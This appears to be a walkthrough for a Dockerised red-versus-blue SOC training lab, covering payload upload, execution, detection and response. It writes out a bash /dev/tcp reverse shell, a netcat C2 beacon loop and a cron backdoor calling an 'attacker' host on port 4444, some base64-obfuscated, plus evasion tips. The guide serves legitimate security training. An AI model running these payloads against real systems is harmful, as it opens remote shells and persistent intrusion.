# 🔴 Red Team Attack Guide — Mini SOC Lab

This guide walks through how to execute a complete Red Team attack against the victim API, including malware upload, execution, and evasion techniques.

---

## **Prerequisites**

- Docker containers running: `docker compose up -d`
- Backend accessible: `http://localhost:8080`
- Frontend accessible: `http://localhost:3000`
- All 4 containers healthy:
  - `soc-backend` (Spring Boot API)
  - `soc-frontend` (React UI)
  - `soc-victim` (Ubuntu target)
  - `soc-attacker` (Ubuntu staging)

**Verify containers:**
```bash
docker compose ps
# Should show 4 running containers
```

---

## **Step 0: Start a New Game**

Before any attack, initialize the game state:

```bash
curl -X POST http://localhost:8080/api/simulation/start \
  -H "Content-Type: application/json" \
  -d '{"difficulty":"MEDIUM"}' | python -m json.tool
```

**Response:**
```json
{
  "message": "Game started",
  "difficulty": "MEDIUM"
}
```

**Backend logs:**
```
🎮 Game started — Red vs Blue adversarial mode
🔴 Red Team: use /api/red-team/execute to run commands on attacker/victim
🔵 Blue Team: monitor alerts, scan files, analyze behavior, respond
cyber_range: victim → soc-victim
cyber_range: attacker → soc-attacker
```

---

## **Step 1: Upload Malware to Victim**

### **Option A: Use Predefined Payload (Reverse Shell)**

```bash
curl -X POST http://localhost:8080/api/red-team/upload-malware \
  -H "Content-Type: application/json" \
  -d '{
    "name": "reverse_shell.sh",
    "payload": "IyEvYmluL2Jhc2gKYmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci80NDQ0IDA+JjE=",
    "obfuscation": "base64",
    "targetPath": "/tmp/reverse_shell.sh"
  }' | python -m json.tool
```

**Response:**
```json
{
  "success": true,
  "filePath": "/tmp/reverse_shell.sh",
  "obfuscation": "base64",
  "points": 5,
  "error": ""
}
```

**What happened:**
- Payload base64-decoded: `#!/bin/bash\nbash -i >& /dev/tcp/attacker/4444 0>&1`
- Written to `/tmp/reverse_shell.sh` on victim
- File made executable: `chmod +x /tmp/reverse_shell.sh`
- Red Team awarded **+5 points**
- Backend logs: `🔴 RED TEAM: malware uploaded → /tmp/reverse_shell.sh (obfuscation: base64)`

---

### **Option B: Upload C2 Beacon Payload**

```bash
curl -X POST http://localhost:8080/api/red-team/upload-malware \
  -H "Content-Type: application/json" \
  -d '{
    "name": "beacon.sh",
    "payload": "IyEvYmluL2Jhc2gKd2hpbGUgdHJ1ZTsgZG8gbmMgLXcgMiBhdHRhY2tlciA0NDQ0IC1lIC9iaW4vYmFzaCAyPi9kZXYvbnVsbDsgc2xlZXAgNTsgZG9uZQ==",
    "obfuscation": "base64",
    "targetPath": "/tmp/beacon.sh"
  }' | python -m json.tool
```

**Response:**
```json
{
  "success": true,
  "filePath": "/tmp/beacon.sh",
  "obfuscation": "base64",
  "points": 5
}
```

**What this payload does:**
```bash
while true; do
    nc -w 2 attacker 4444 -e /bin/bash 2>/dev/null
    sleep 5
done
```
- Persistent C2 beacon loop
- Attempts connection to attacker every 5 seconds
- Gives attacker shell access if listener is active
- **Detectable by:** Behavioral analysis (C2_COMMUNICATION, port 4444)

---

### **Option C: Upload Persistence (Cron Backdoor)**

```bash
curl -X POST http://localhost:8080/api/red-team/upload-malware \
  -H "Content-Type: application/json" \
  -d '{
    "name": "persistence_cron.sh",
    "payload": "IyEvYmluL2Jhc2gKKGNyb250YWIgLWwgMj4vZGV2L251bGw7IGVjaG8gIiovNSAqICogKiAqIG5jIC13IDIgYXR0YWNrZXIgNDQ0NCAtZSAvYmluL2Jhc2giKSB8IGNyb250YWIgLQ==",
    "obfuscation": "base64",
    "targetPath": "/tmp/persistence_cron.sh"
  }' | python -m json.tool
```

**Decoded payload:**
```bash
(crontab -l 2>/dev/null; echo "*/5 * * * * nc -w 2 attacker 4444 -e /bin/bash") | crontab -
```

**Effect:**
- Installs a new cron job that runs every 5 minutes
- Each execution spawns a reverse shell back to attacker
- **Survives kill -9** (attacker can kill process, but cron will respawn it in 5 min)
- **Detectable by:** CRON_ADDED event, persistence flag in alerts

---

## **Step 2: Execute Malware on Victim**

Now that malware is uploaded, **trigger execution** (remember: upload ≠ execute):

### **Execute Reverse Shell (One-time)**

```bash
curl -X POST http://localhost:8080/api/red-team/execute \
  -H "Content-Type: application/json" \
  -d '{
    "container": "soc-victim",
    "command": "bash /tmp/reverse_shell.sh &"
  }' | python -m json.tool
```

**Response:**
```json
{
  "success": true,
  "output": "",
  "error": "",
  "points": 10,
  "durationMs": 245,
  "async": true
}
```

**What happened:**
- Command executed in background (`&`)
- System detected async pattern (`while true` / `&`)
- Bash process spawned, attempted connection to attacker:4444
- Red Team awarded **+10 points** (reverse shell execution)
- Backend logs:
  ```
  🔴 RED TEAM: command succeeded on soc-victim (+10 pts)
  ```

**Why Blue Team will see this:**
1. **2-3 seconds later** → Monitoring agent detects new `bash` process
2. Sends `PROCESS_SPAWNED` event with cmdline: `bash -i >& /dev/tcp/attacker/4444 0>&1`
3. EventAlertMapper identifies: reverse shell pattern
4. Generates alert:
   ```json
   {
     "severity": "CRITICAL",
     "title": "Reverse Shell Detected",
     "detail": "Process 'bash' (PID 1234) appears to be a reverse shell: bash -i >& /dev/tcp/attacker/4444 0>&1",
     "mitreId": "T1059.004",
     "mitreName": "Unix Shell",
     "actionableFields": {
       "killPid": 1234,
       "blockIp": "172.20.0.2"  // (attacker container IP)
     },
     "threatImpact": 30
   }
   ```

---

### **Execute C2 Beacon (Persistent Loop)**

```bash
curl -X POST http://localhost:8080/api/red-team/execute \
  -H "Content-Type: application/json" \
  -d '{
    "container": "soc-victim",
    "command": "bash /tmp/beacon.sh &"
  }' | python -m json.tool
```

**Response:**
```json
{
  "success": true,
  "output": "",
  "error": "",
  "points": 10,
  "async": true
}
```

**Ongoing behavior (every 5 seconds):**
```
┌─ Beacon spawns                       (PROCESS_SPAWNED event)
├─ Connects to attacker:4444          (NETWORK_CONNECTION event)
├─ Sleeps 5 seconds
└─ Loop repeats (new process each time = multiple PROCESS_SPAWNED events)
```

**Multiple alerts generated over time:**
- `PROCESS_SPAWNED` (every 5s) → "Suspicious Process Execution"
- `NETWORK_CONNECTION` → "Command & Control Connection Established" (CRITICAL)
- Behavioral analysis will flag: C2_COMMUNICATION, RAPID_PROCESS_SPAWN

---

### **Install Persistence (Cron)**

```bash
curl -X POST http://localhost:8080/api/red-team/execute \
  -H "Content-Type: application/json" \
  -d '{
    "container": "soc-victim",
    "command": "bash /tmp/persistence_cron.sh"
  }' | python -m json.tool
```

**Response:**
```json
{
  "success": true,
  "output": "",
  "error": "",
  "points": 10,
  "async": false,
  "durationMs": 512
}
```

**Immediate effect:**
- Crontab entry added: `*/5 * * * * nc -w 2 attacker 4444 -e /bin/bash`
- No visible process yet (scheduled job)

**5 minutes later** → Cron daemon triggers, spawns nc process, beacon connects

**Blue Team alerts:**
- `CRON_ADDED` event → "Persistence Installed" alert (HIGH)
- System sets `gameState.persistenceActive = true`
- Backend notes: "Persistence mechanisms detected"

---

## **Step 3: Reconnaissance (Optional but Recommended)**

Before main attacks, Red Team often does recon:

### **Scan Victim Network**

```bash
curl -X POST http://localhost:8080/api/red-team/execute \
  -H "Content-Type: application/json" \
  -d '{
    "container": "soc-attacker",
    "command": "nmap -sn 172.20.0.0/24"
  }' | python -m json.tool
```

**Response:**
```json
{
  "success": true,
  "output": "Nmap scan report for 172.20.0.1\nHost is up (0.0039s latency).\n...",
  "error": "",
  "points": 1,
  "durationMs": 52165,
  "async": false
}
```

**Points:** Only **+1 pt** for recon (low-impact)

**Blue Team perspective:**
- Runs on `soc-attacker` (not victim), so **no local detection**
- Only visible if Blue monitors outbound traffic from victim
- Network-based IDS/passive monitoring would catch this (not implemented yet)

---

## **Step 4: Monitor Red Team History**

Check what Red Team has executed so far:

```bash
curl -X GET http://localhost:8080/api/red-team/history | python -m json.tool
```

**Response:**
```json
[
  {
    "id": 1,
    "timestamp": "2026-04-18T15:30:45.123Z",
    "container": "soc-victim",
    "command": "MALWARE_UPLOAD: reverse_shell.sh",
    "success": true,
    "points": 5
  },
  {
    "id": 2,
    "timestamp": "2026-04-18T15:30:52.456Z",
    "container": "soc-victim",
    "command": "bash /tmp/reverse_shell.sh &",
    "success": true,
    "points": 10,
    "output": "",
    "error": ""
  },
  {
    "id": 3,
    "timestamp": "2026-04-18T15:31:10.789Z",
    "container": "soc-victim",
    "command": "bash /tmp/persistence_cron.sh",
    "success": true,
    "points": 10
  }
]
```

---

## **Step 5: Complete Attack Scenario**

### **Timeline (as Red Team sees it):**

```
T+0s:   Game started
T+10s:  Upload reverse_shell.sh (+5 pts) → Red: 5, Blue: 0
T+15s:  Execute reverse shell (+10 pts) → Red: 15, Blue: 0
T+18s:  Execute beacon.sh (+10 pts) → Red: 25, Blue: 0
T+25s:  Install persistence cron (+10 pts) → Red: 35, Blue: 0
T+28s:  Upload ransomware sim (+5 pts) → Red: 40, Blue: 0
T+30s:  Red Team pauses to observe
```

### **Timeline (as Blue Team sees it):**

```
T+17s:  ⚠️  ALERT: Reverse Shell Detected (PID 1234)
        → Can kill PID or block attacker IP
T+23s:  ⚠️  ALERT: C2 Beacon Loop Detected (PID 1245)
        → New PROCESS_SPAWNED every 5s
T+26s:  ⚠️  ALERT: Persistence Installed (cron added)
        → Recommends remove cron
T+30s:  Blue Team Dashboard:
        ├─ Active Alerts: 4
        ├─ Critical: 3
        ├─ Threat Score: 65 (MEDIUM → HIGH)
        ├─ Red Score: 40
        └─ Blue Score: 0 (no defensive actions yet)
```

---

## **Step 6: Blue Team Response (for testing)**

### **Blue scans the uploaded malware:**

```bash
curl -X POST http://localhost:8080/api/blue-team/scan-file \
  -H "Content-Type: application/json" \
  -d '{"filePath": "/tmp/reverse_shell.sh"}' | python -m json.tool
```

**Response:**
```json
{
  "success": true,
  "filePath": "/tmp/reverse_shell.sh",
  "hash": "a1b2c3d4...",
  "fileType": "ELF 64-bit LSB executable",
  "entropy": 3.45,
  "verdict": "MALICIOUS",
  "threatScore": 90,
  "threats": [
    {
      "type": "TROJAN",
      "name": "Trojan.ReverseShell.Bash",
      "severity": "CRITICAL",
      "detail": "Bash reverse shell pattern detected"
    }
  ]
}
```

**Blue gets +20 pts for scanning** → Blue: 20

---

### **Blue kills malicious process:**

```bash
curl -X POST http://localhost:8080/api/actions/kill-process \
  -H "Content-Type: application/json" \
  -d '{"pid": 1234}' | python -m json.tool
```

**Response:**
```json
{
  "success": true,
  "action": "kill_process",
  "pid": 1234,
  "host": "soc-victim",
  "details": "Process 1234 terminated"
}
```

**Blue gets +30 pts for killing process** → Blue: 50

---

### **Blue blocks attacker IP:**

```bash
curl -X POST http://localhost:8080/api/actions/block-ip \
  -H "Content-Type: application/json" \
  -d '{"ip": "172.20.0.2"}' | python -m json.tool
```

**Response:**
```json
{
  "success": true,
  "action": "block_ip",
  "ip": "172.20.0.2",
  "host": "soc-victim",
  "details": "IP 172.20.0.2 blocked (INPUT + OUTPUT)"
}
```

**Effect:**
- `iptables -A INPUT -s 172.20.0.2 -j DROP`
- `iptables -A OUTPUT -d 172.20.0.2 -j DROP`
- Beacon can no longer connect

**Blue gets +25 pts for blocking IP** → Blue: 75

---

### **Blue removes cron persistence:**

```bash
curl -X POST http://localhost:8080/api/actions/remove-cron \
  -H "Content-Type: application/json" | python -m json.tool
```

**Response:**
```json
{
  "success": true,
  "action": "remove_cron",
  "host": "soc-victim",
  "details": "Cron jobs cleared, beacon script removed"
}
```

**Blue gets +20 pts for removing persistence** → Blue: 95

---

## **Complete Attack via Frontend UI**

Alternatively, use the React UI at `http://localhost:3000`:

### **Red Team Tab:**

1. **Payloads Tab:**
   - Click "Reverse Shell" button → uploads `/tmp/reverse_shell.sh` (+5 pts)
   - See upload status: ✅ reverse_shell.sh uploaded to /tmp/reverse_shell.sh

2. **Quick Attacks Tab:**
   - Click "🐚 Reverse Shell" → executes `bash /tmp/reverse_shell.sh attacker 4444 &` (+10 pts)
   - See command in history with success indicator

3. **Terminal Tab:**
   - Select container: `soc-victim`
   - Type: `bash /tmp/beacon.sh attacker 4444 5 &`
   - Click ▶ → executes beacon

### **Blue Team Tab:**

1. **Processes Button:**
   - Shows `ps aux` output → see bash, nc processes

2. **File Scanner:**
   - Enter path: `/tmp/reverse_shell.sh`
   - Click 🔬 Scan File
   - See verdict: MALICIOUS, threats detected

3. **Behavioral Analysis:**
   - Click 🧠 Behavioral Analysis
   - See anomalies: C2_COMMUNICATION (score 85), RAPID_PROCESS_SPAWN
   - Recommendation: INVESTIGATE_AND_RESPOND

### **Action Panel:**

1. **Kill Process:**
   - Enter PID from processes list → click "Kill Process"

2. **Block IP:**
   - Enter IP → click "Block IP" (e.g., 172.20.0.2)

3. **Isolate Host:**
   - Click "Isolate Host" → full network isolation

---

## **Attack Scoring**

### **Red Team Points:**

| Action | Points |
|--------|--------|
| Recon (nmap, ping) | +1 |
| Basic command (whoami, ls) | +1 |
| Upload malware | +5 |
| Reverse shell execution | +10 |
| C2 beacon setup | +10 |
| Cron persistence | +10 |
| Ransomware simulation | +20 |
| Data exfiltration | +20 |

### **Blue Team Points:**

| Action | Points |
|--------|--------|
| File scan (detect malware) | +20 |
| Kill process | +30 |
| Block IP | +25 |
| Remove cron | +20 |
| Manual alert resolve | +15 (LOW) to +30 (CRITICAL) |
| Isolate host | +40 |
| Behavioral analysis (with findings) | +15 |

---

## **Expected Threat Score Progression**

```
Initial: threatScore = 0

After reverse shell execution:
  └─ PROCESS_SPAWNED alert (+30 threat impact)
     threatScore = 30 (MEDIUM)

After beacon loop detected:
  └─ NETWORK_CONNECTION alert (+30 threat impact)
     threatScore = 60 (HIGH)

After cron persistence:
  └─ CRON_ADDED alert (+20 threat impact)
     threatScore = 80 (HIGH)

After Blue kills process & blocks IP:
  └─ threatScore -= 10 + 15 (from actions)
     threatScore = 55

After Blue removes cron:
  └─ threatScore -= 10
     threatScore = 45 (MEDIUM)

When all threats gone:
  └─ Phase transitions to CONTAINED
```

---

## **Evasion Tips (for advanced Red Team play)**

1. **Obfuscate payloads:** Use hex encoding instead of base64
   ```json
   "obfuscation": "hex"
   ```

2. **Spread attacks over time:** Don't upload + execute immediately
   - Gives Blue less data to correlate
   - Harder to establish timeline

3. **Use multiple beacons:** Upload beacon twice to different paths
   - If Blue kills one, the other survives

4. **Monitor Blue's response:** Check `GET /api/dashboard/summary` to see:
   - How many alerts Blue has
   - Whether threat score is rising
   - Whether Blue has taken actions

5. **Adapt to Blue Team:** If IP is blocked, connect from a different process
   - Change beacon port each execution

---

## **Testing Persistence (Cron Resurrection)**

### **Test that cron survives kill:**

```bash
# Get all processes
curl -X GET http://localhost:8080/api/blue-team/processes | grep nc

# Kill one nc process
curl -X POST http://localhost:8080/api/actions/kill-process \
  -H "Content-Type: application/json" \
  -d '{"pid": 5678}' 

# Wait 5 seconds (cron interval)
sleep 5

# Check processes again
curl -X GET http://localhost:8080/api/blue-team/processes | grep nc
# NEW nc process should appear (spawned by cron)
```

---

## **Troubleshooting**

### **Malware upload fails:**
```json
{"success": false, "reason": "Game is not active"}
```
→ Run `POST /api/simulation/start` first

### **Command execution timeout:**
- Long-running commands (nmap) may exceed 15s docker exec timeout
- Set `"async": true` expected in response

### **No alerts appearing:**
- Wait 2-3 seconds for monitoring agent to detect
- Check `GET /api/dashboard/logs` for raw events
- Verify container still running: `docker compose ps`

### **Reverse shell not working:**
- Attacker container must have netcat: `docker exec soc-attacker nc -l -p 4444`
- Listener must be active before executing shell
- Beacon will timeout if no listener

---

## **Next Steps**

- **Escalate attacks:** Try lateral movement, data exfiltration
- **Test Blue response:** See how fast alerts generate, how actions affect threat
- **Analyze end-to-end:** Full Red attack → Blue detection → Blue response
- **Run behavioral analysis** after multiple attacks to see correlations

Good luck, Red Team! 🔴

